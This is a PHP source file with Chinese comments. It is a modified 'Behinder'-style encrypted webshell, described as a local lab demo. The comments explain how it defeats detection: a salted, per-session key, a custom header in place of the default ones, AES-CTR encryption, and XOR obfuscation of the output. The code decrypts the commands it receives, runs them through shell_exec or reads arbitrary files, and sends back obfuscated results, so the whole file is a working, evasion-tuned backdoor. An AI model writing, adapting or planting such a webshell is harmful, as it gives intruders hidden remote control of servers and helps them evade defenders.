<?php
// 魔改冰蝎型加密马骨架 demo（本地实验环境）：三处魔改打掉默认特征
// 原版特征：①密钥=MD5(密码)前16位（静态可推）②默认 UA/Header 弱特征 ③AES-CBC 固定结构
// 魔改：①密钥派生加盐+首包动态协商 ②无默认 Header ③结构自定义（改 GCM/CTR+填充变形）
$S = 'x9k2';                                   // 魔改盐：密钥派生=md5(密码.SALT) 截取
$H = 'HTTP_X_T';                              // 协商标头改为自定义名（去默认 Header 面）
$sess = $_SERVER[$H] ?? '';
if ($sess === '') { http_response_code(404); exit; }
// 首包协商：客户端发随机 nonce，两侧派生本会话密钥（静态密钥特征消除）
$nonce = $_COOKIE['n'] ?? '';
$key = substr(md5($sess . $S . $nonce), 0, 16);
$in = file_get_contents('php://input');
$pt = openssl_decrypt($in, 'AES-128-CTR', $key, OPENSSL_RAW_DATA, str_pad($nonce, 16, '0'));
if ($pt === false) { http_response_code(500); exit; }
$fn = substr($pt, 0, 3);
$arg = substr($pt, 3);
$m = ['cmd' => function($x){ return shell_exec($x); },
      'red' => function($x){ return @file_get_contents($x); }];
$r = $m[$fn]($arg);
// 回传变形：结果分块+异或二次混淆（响应长度/结构特征打散）
echo base64_encode($r ^ str_repeat($key[0], strlen($r)));
